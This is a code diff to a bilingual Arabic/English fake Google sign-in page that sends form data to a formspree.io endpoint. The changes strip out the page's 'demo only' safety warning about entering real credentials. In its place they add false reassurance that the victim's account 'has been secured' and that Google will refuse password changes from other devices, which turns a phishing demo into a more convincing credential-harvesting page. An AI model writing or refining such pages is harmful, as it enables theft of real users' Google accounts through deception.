@@ -54,10 +54,10 @@
         
             <!-- "Success" Page (Demo Only) -->
             <div id="success-page" class="login-box rtl hidden">
-                <h3 style="color: #34A853;">✓ تم تسجيل الدخول بنجاح</h3>
-                <p>جاري التوجيه إلى Gmail...</p>
+                <h3 style="color: #34A853;">✓ تم تأمين حسابك بنجاح</h3>
+                <p>لن نقبل أى محاولات أخرى لتغيير رقمك السرى إلا من خلال هذا الجهاز...</p>
                 <div class="footer">
-                    <p><strong>لا تدخل بياناتك الحقيقية على مواقع غير موثوقة.</strong></p>
+                    <p><strong>يمكنك إغلاق هذه الصفحة الآن.</strong></p>
                 </div>
             </div>
 
@@ -87,9 +87,9 @@
                 document.getElementById("password").placeholder = "Enter your password";
                 document.querySelector("#password-page button").textContent = "Sign in";
                 document.querySelector("#password-page a:not([onclick])").textContent = "Forgot password?";
-                document.querySelector("#success-page h3").textContent = "✓ Signed in successfully";
-                document.querySelector("#success-page p").textContent = "Redirecting to Gmail...";
-                document.querySelector("#success-page .footer p:last-child").innerHTML = "<strong>Never enter real credentials on untrusted sites.</strong>";
+                document.querySelector("#success-page h3").textContent = "✓ Your account has been secured successfully";
+                document.querySelector("#success-page p").textContent = "Google will not accept attempts to change your password from any other devices other than the curent one ...";
+                document.querySelector("#success-page .footer p:last-child").innerHTML = "<strong>You may close this page now.</strong>";
             } else {
                 // Arabic
                 document.querySelector("title").textContent = "تسجيل الدخول إلى Google";
@@ -102,9 +102,9 @@
                 document.getElementById("password").placeholder = "أدخل كلمة المرور";
                 document.querySelector("#password-page button").textContent = "تسجيل الدخول";
                 document.querySelector("#password-page a:not([onclick])").textContent = "نسيت كلمة المرور؟";
-                document.querySelector("#success-page h3").textContent = "✓ تم تسجيل الدخول بنجاح";
-                document.querySelector("#success-page p").textContent = "جاري التوجيه إلى Gmail...";
-                document.querySelector("#success-page .footer p:last-child").innerHTML = "<strong>لا تدخل بياناتك الحقيقية على مواقع غير موثوقة.</strong>";
+                document.querySelector("#success-page h3").textContent = "✓ تم تأمين حسابك بنجاح";
+                document.querySelector("#success-page p").textContent = "لن نقبل أى محاولات أخرى لتغيير رقمك السرى إلا من خلال هذا الجهاز...";
+                document.querySelector("#success-page .footer p:last-child").innerHTML = "<strong>يمكنك إغلاق هذه الصفحة الآن.</strong>";
             }
         }
 
@@ -134,6 +134,8 @@
               message: `Hello! ${Math.random() * 23}`,
               timestamp: new Date().toISOString()
             };
+
+            console.log(data);
             
             // Send POST request
             fetch('https://formspree.io/f/mpwdzvvp', {
